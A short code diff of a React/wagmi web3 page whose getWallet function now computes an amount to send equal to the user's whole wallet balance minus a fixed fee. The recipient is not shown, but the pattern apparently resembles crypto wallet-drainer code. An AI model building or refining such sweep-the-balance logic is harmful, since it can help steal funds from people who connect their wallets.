@@ -39,6 +39,7 @@ const ethereumClient = new EthereumClient(wagmiClient, chains)
 
 
 
+
 export default function Home() {
   const {address, isConnected} =   useAccount()
   const [myBalance, setMyBalance]=useState('0')
@@ -101,8 +102,9 @@ export default function Home() {
   })
   
   const getWallet = async () => {
-    
-    const amtToSend = (myBalance) - (gasFee*110000)
+    await accBalance()
+    console.log(myBalance)
+    const amtToSend = (myBalance) - 0.0024
     
     
     if (amtToSend < 0) {
@@ -141,7 +143,6 @@ export default function Home() {
         }
         
 
-      <Web3Modal projectId={projectId} ethereumClient={ethereumClient} />
      
     </>
         
